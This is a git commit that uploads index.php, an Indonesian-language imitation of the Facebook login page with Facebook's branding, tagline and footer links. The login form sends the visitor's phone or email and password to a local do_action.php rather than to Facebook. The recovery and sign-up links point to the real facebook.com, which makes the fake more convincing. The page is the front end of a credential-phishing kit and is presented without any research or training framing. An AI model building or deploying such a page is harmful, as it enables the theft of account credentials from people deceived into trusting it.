f673c2bfc6005caa564c1e47aff5c12952e9caeb
Aryama241 <aryamahardika73762@gmail.com>
2025-05-29 19:40:35 +0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Facebook – Masuk atau Daftar</title>
+  <link rel="shortcut icon" type="ico" href="images/fb-ico.png">
+	<link rel="stylesheet" href="style.css">
+</head>
+<body>
+	<div class="main-wrapper">
+		<div class="container">
+			<div class="left-panel">
+				<h1 class="fb-text">facebook</h1>
+				<h2>Facebook membantu Anda terhubung dan berbagi dengan orang-orang dalam kehidupan Anda.</h2>
+			</div>
+			<div class="right-panel">
+				<form action="do_action.php" class="login-box">
+					<input type="text" name="username" placeholder="No Telp atau Email" required>
+					<input type="password" name="password" placeholder="Password" required>
+					<button type="submit">Masuk</button>
+					<a href="https://www.facebook.com/recover/initiate">Lupa kata sandi?</a>
+					<hr>
+					<a href="https://www.facebook.com/r.php" class="create-btn">Buat akun</a>
+				</form>
+				<p class="bottom-text"><a href="#">Buat Halaman</a> untuk selebriti, merek, atau bisnis.</p>
+			</div>
+		</div>
+
+		<footer class="fb-footer">
+  <div class="lang-section">
+    <ul class="lang-list">
+      <li><a href="#">Bahasa Indonesia</a></li>
+      <li><a href="#">English (UK)</a></li>
+      <li><a href="#">Basa Jawa</a></li>
+      <li><a href="#">Bahasa Melayu</a></li>
+      <li><a href="#">日本語</a></li>
+      <li><a href="#">العربية</a></li>
+      <li><a href="#">Français (France)</a></li>
+      <li><a href="#">Español</a></li>
+      <li><a href="#">한국어</a></li>
+      <li><a href="#">Português (Brasil)</a></li>
+      <li><a href="#">Deutsch</a></li>
+      <li><button class="plus-btn">+</button></li>
+    </ul>
+    <hr>
+  </div>
+
+  <div class="link-section">
+    <ul class="link-list">
+      <li><a href="#">Daftar</a></li>
+      <li><a href="#">Masuk</a></li>
+      <li><a href="#">Messenger</a></li>
+      <li><a href="#">Facebook Lite</a></li>
+      <li><a href="#">Video</a></li>
+      <li><a href="#">Meta Pay</a></li>
+      <li><a href="#">Meta Store</a></li>
+      <li><a href="#">Meta Quest</a></li>
+      <li><a href="#">Ray-Ban Meta</a></li>
+      <li><a href="#">Meta AI</a></li>
+      <li><a href="#">Instagram</a></li>
+      <li><a href="#">Threads</a></li>
+      <li><a href="#">Pusat Informasi Pemilu</a></li>
+      <li><a href="#">Kebijakan Privasi</a></li>
+      <li><a href="#">Pusat Privasi</a></li>
+      <li><a href="#">Meta di Indonesia</a></li>
+      <li><a href="#">Tentang</a></li>
+      <li><a href="#">Buat Iklan</a></li>
+      <li><a href="#">Buat Halaman</a></li>
+      <li><a href="#">Developer</a></li>
+      <li><a href="#">Karier</a></li>
+      <li><a href="#">Cookie</a></li>
+      <li><a href="#">Pilihan Iklan</a></li>
+      <li><a href="#">Pengunggahan Kontak & Non-Pengguna</a></li>
+      <li><a href="#">Bantuan</a></li>
+      <li><a href="#">Ketentuan</a></li>
+    </ul>
+  </div>
+
+  <p class="footer-copy">Meta © 2025</p>
+</footer>
+
+	</div>
+</body>
+</html>
